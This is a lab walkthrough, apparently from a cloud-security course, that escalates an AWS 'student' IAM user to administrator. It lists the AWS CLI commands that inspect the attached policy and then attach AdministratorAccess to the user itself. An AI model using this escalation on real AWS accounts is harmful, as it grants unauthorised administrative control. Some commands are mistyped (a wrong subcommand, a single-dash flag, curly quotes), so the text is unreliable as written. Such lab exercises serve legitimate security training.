# Overly permissive permission I

Overly Permissive Permission can be abused by a user to perform privileged operations.

Objective: Leverage the policy attached to the student user and attain administrative privileges on the AWS account.

----

1. Get access to AWS lab credentials.
2. Configure AWS CLI.
3. Check identity with:

```text
aws sts get-caller-identity
```

4. List the policies attached to the `student` user:

```text
aws iam list-attached-user-policies --user-name student
```

5. Check policy details for the Service policy:

```text
aws iam get-policy --policy-arn arn:aws:iam::607486832336:policy/Service
```

6. View policy details for the v1 version of Service policy:

```text
aws iam get-policy-version --policy-arn arn:aws:iam::607486832336:policy/Service --version-id v1
```

7. Try creating a new user, named bob:

```text
aws iam create-user --user-name Bob
```

FAIL.

8. Get `AdministratorAccess` policy `arn`:

```text
aws iam list-policies | grep ‘AdministratorAccess’
```

9. Attach administrator policy to the current user:

```text
aws iam attach-user-policy --user-name student --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

10. Check with:

```text
aws iam list-attached-policies --user-name student
```

11. Try creating a new user named Bob again:

```text
aws iam create-user -user-name Bob
```

Successfully performed a privileged operation.
